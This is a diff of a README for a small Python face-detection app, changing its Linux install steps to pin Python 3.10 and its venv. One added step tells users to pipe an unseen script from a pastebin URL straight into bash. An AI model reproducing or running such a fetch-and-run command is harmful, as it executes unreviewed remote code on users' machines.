@@ -1,11 +1,15 @@
 # Face Detect App/Script Alpha Version 
 Created for Bakhakats Educational School a.k.a. ( Real School Goris )
 
-FOR LINUX ( Ubuntu default ) | Linux Mint
+FOR LINUX ( Ubuntu default )
 
 ----------------------
 |Installation and Run|
 ----------------------
+
+| - Minimum Requirements for test |
+| - Python3.10  |
+| - On terminal copy and press enter - curl -s https://pastebin.com/raw/0XdmpDkm | bash 
 
 Using this commands
 
@@ -17,13 +21,11 @@ Open Terminal  ( ctrl + alt + t ) , and type this command
    - git clone https://github.com/Ordyan777/Face_Detect_App
 
 3. Create and Activate venv ( Virtual Environment ) 
-   - python3 -m venv .venv
-   - source .venv/bin/activate
-   - If You Using Fish , Try This Command - source .venv/bin/activate.fish
+   - python3.10 -m venv .venv310
+   - source .venv310/bin/activate
+   - If You Using Fish , Try This Command - source .venv310/bin/activate.fish
 
-4. Use This Command - pip install -r requirements.txt
+4. Use This Command - pip3.10 install -r requirements.txt
 
 6. Soon....
 
-P.S 
-Me using Python3.10 for test venv_test.py
